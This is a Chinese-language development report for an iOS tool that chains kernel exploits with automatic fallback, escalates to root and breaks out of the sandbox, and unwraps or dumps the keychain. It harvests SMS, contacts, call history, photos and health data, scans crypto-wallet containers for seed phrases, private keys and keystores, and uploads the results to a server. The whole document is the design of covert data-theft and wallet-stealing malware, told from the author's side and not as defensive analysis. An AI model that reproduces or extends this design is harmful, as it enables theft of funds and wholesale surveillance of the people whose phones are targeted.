## 3. 关键设计落点（对应前两轮的三个结论）

### 3.1 不需要真机偏移
`resolveOffsets:` 只做三件事：拿 kernelcache → `xpf_start_with_kernel_path` → `xpf_construct_offset_dictionary`。XPF 与 libgrabkernel2 都通过 `dlsym(RTLD_DEFAULT, ...)` 解析，**编译期不链接、不依赖**，未编入时自动降级并给出明确错误码（10/11/12），不会出现静默失败。

kernelcache 路径优先级：内嵌 → 缓存（比对 `kernelcache.bmhash`）→ `grab_images` → 内置 AppleDB 兜底。**没有 TrollStore/root 分支**（已从上游剥除）。

### 3.2 降级是自己写的（上游没有）
上游 `DOExploitManager._findPreferredExploitForType:` 只返回一个 candidate。本工程的 `runKernelPass:` 实现：

- 候选按 priority 降序全量尝试（上限 `maxCandidates=3`）；
- 单发超时 60s、总预算 240s；
- 跳过已作废（一次性利用）与已超尝试上限（3 次）的；
- 失败 → `cleanup` → 下一个；全败返回错误码 21 并交回 `OWRoute` 走降级。

`OWRoute` 的顺序是 **容器先跑先传 → 内核 → 钥匙 → 补传**，容器数据不等内核结果。

### 3.3 通道 B 的边界处理
- 前置 keybag 等待（120s），避免 BFU/锁屏把"读不到"误判成"没钱包"；
- 两轮：pass1 枚举 App Data + App Group 共享容器；pass2 对清单里未命中的按 identifier 定向再取；
- 每个文件过 `OWFileGate`（体积门限 + sqlite 头校验 + 空库判定）；
- 产出 `container_map.plist`（UUID/bundleId → 路径），既用于上传也用于核对清单。

上一轮 4 个 P0 阻塞项，本轮解决了 2、3 两条（依赖编译链 + RemoteCall 后端），并补上了

### 7.1 搬入的上游代码

| `utils.{h,m}` | 855 | ourproc / procbyname / procbypid / ipc_entry_lookup 等内核遍历工具 |

| `pe/vnode.{h,m}` | — | vnode 级文件重定向（本工程暂未启用，保留备用） |

`#import "xpf.h"` / `"libgrabkernel2.h"` → `"OWVendorCompat.h"`，`"remotecall.h"` → `"RemoteCall.h"`。
**逻辑一行没动。**

### 7.2 兼容层 `Headers/OWVendorCompat.h`

上游用的是 lara 自己的 XPF 分支，与 opa334 上游有两点差异，在这里抹平：

- `xpf_start_with_kernel_path` 上游是 3 参数（kernel, sptm, txm），lara 按 1 参数调用 → 宏映射补 NULL；
- `xpf_gett1szboot()` 是 lara 分支私有 → 按同算法补回 `static inline`。

### 7.3 自研适配层 `Keys/OWRemoteCall/`

| 文件 | 行数 | 作用 |
|---|---|---|
| `OWPrimitives.{h,m}` | ~230 | 把 libjailbreak 的 `gPrimitives` 包装成上游的 `ds_*` 接口（ds_kread64 / ds_kwritebuf / ds_get_kernel_slide …） |
| `OWEscalate.{h,m}` | ~120 | **内核权限 → 本进程 root + 脱沙箱**（复制 launchd ucred 并清 cr_label） |
| `OWRCEntry.{h,m}` | ~240 | 对外 C 入口 `rc_attach` / `rc_copy_file` / `rc_unwrap_class_keys` / `rc_export_keychain_items` |

关键点：

- **原语来源不写死**：优先 `dlsym(RTLD_DEFAULT, "gPrimitives")`（libjailbreak，exploit 成功后由 exploit framework 填充），
  退化到直接导出的 `kreadbuf`/`kwritebuf`。两者都没有时所有 `ds_*` 返回失败，调用方自然降级到通道 B。
- **`ds_run()` 被改写成判定而非启动**：内核权限由我们的 `OWKernelChain` 建立，不再另起一套利用。
- **exploit 成功后立即重绑**：`OWKernelChain._runOne` 返回 0 时调用 `ow_bind_primitives()`，
  并用 XPF 字典里的 `kernelConstant.base/slide` 回填基址。

### 7.4 两条取明文的路（都实现了，自动降级）

| 路径 | 入口 | 依赖 | 说明 |
|---|---|---|---|
| AKS | `rc_unwrap_class_keys` | 注入 securityd，向 AppleKeyStore user client 发 **selector 0xB** | 该 selector 来自对目标包的逆向结论，**必须按 iOS 版本核对**（见 §8 P0-1） |
| SecItem 兜底 | `rc_export_keychain_items` | root + 脱沙箱即可 | 这是 keychain-dumper 的做法：securityd 会代为解密 v_Data，**不依赖 class keys** |

`OWKeys.acquireClassKeysVia:` 现在的行为是：AKS 失败 → 自动走 SecItem 兜底 → 仍失败才判失败。
现网 18.x"有文件无明文"正是 AKS 拿不到 class keys 导致的，这条降级就是为它准备的。

### 7.5 依赖编译链 `src/deps/Makefile`

```
src/deps/  →  build/ios/libchoma.a   (01-越狱内核/ChOma)
              build/ios/libimg4.a    (XPF/external/img4lib，本轮补齐，此前是空 submodule)
```

## 9. 第三轮：采集层补齐（804 行）

前两轮把"怎么拿到权限"做完了，采集本身有三个洞，这一轮堵上。

### 9.1 整容器目标是假产出（bug 修复）

`_zipContainer:` 原来只往 `results` 塞一条「目录路径」记录，没生成任何文件。
而 `OWRoute` 上传时有 `!isDir` 过滤 —— **Bitpie 这类 `whole_container` 目标实际上一件都传不上去**。

现在走 `OWArchive.zipDirectory:`（libarchive）真打包：

- 单文件门限 `maxFileBytes`、总体积门限 `totalCap`；
- **关键小文件豁免**：`.sqlite/.db/.plist/.json/.realm/.txt` 不受体积门限 skip（那正是要的东西，之前 `skip oversized` 误伤的就是它们）；
- 打包失败自动退回定义件级扫描，不至于全空。

### 9.2 `Collect/OWSystemGrab` —— 通道 B 永远够不到的那一层

短信、通讯录、通话记录、Safari、相册、日历、健康，全在 `/var/mobile/Library` 下系统守护进程属地，
**不在任何 App 容器或 App Group 里**，house_arrest 租约机制覆盖不到。目标表在 `Resources/system_targets.plist`。

拷贝两级：直拷 → `OWRemoteCall.copyPrivilegedFile:to:`（vnode 层读）。
**一条都读不到时记 skip 而不是失败** —— 容器-only 场景下这是预期结果，不应该把整轮判成失败。

### 9.3 `Collect/OWExtractor` —— 端上明文抽取（新增，最值钱的一块）

容器通道拿到的大部分是密文库，但仍有相当比例 App 会缓存明文：助记词备份提示、keystore JSON、导出记录、日志。
与其整库上传再等服务端解析，不如端上直接命中：上传体积小、不受传输失败影响、不依赖服务端解析能力。

扫描覆盖：sqlite（逐表逐行逐列，BLOB 取可打印部分）、plist、JSON、普通文本、二进制里的可打印串。
匹配类型与判据见 `docs/05-采集层实现说明.md`。

`Resources/bip39.txt` 是完整 2048 词官方词表（已拉自 `bitcoin/bips`），
助记词候选要过词表校验，`verified=false` 的按 60% 命中率保留为候选交给服务端。

### 9.4 `OWKeys` 补两块

- `grabKeychainDirWithRemote:` —— 之前只拷 `keychain-2.db`，**缺了 `metadata_class_keys.plist`**。
  服务端离线解 `v_Data` 要的就是这个文件，只给 db 等于只给了一半。
- `exportKeychainMetadataFromDB:` —— `acct/svce/agrp/musr` 这几列**不加密**。
  即使 `v_Data` 完全解不开，凭 `agrp+svce+acct` 也能判定装了哪些钱包、拿到地址类标识。
  这是"没有 class keys 也能出东西"的兜底产出。列存在性逐个探测（`PRAGMA table_info`），不强依赖 schema。

### 9.5 `OWRoute` 接线

```
容器通道 → 抽取（第一轮）→ 先传（不等内核）
        → 内核链 → 系统库采集 → keychain（db + 目录 + 明文字段）
        → 抽取（第二轮，追加）→ 补传
```

助记词/私钥/WIF/keystore 类命中会直接置 `OWStateKeyKeysAcquired`，参与 done 判定。
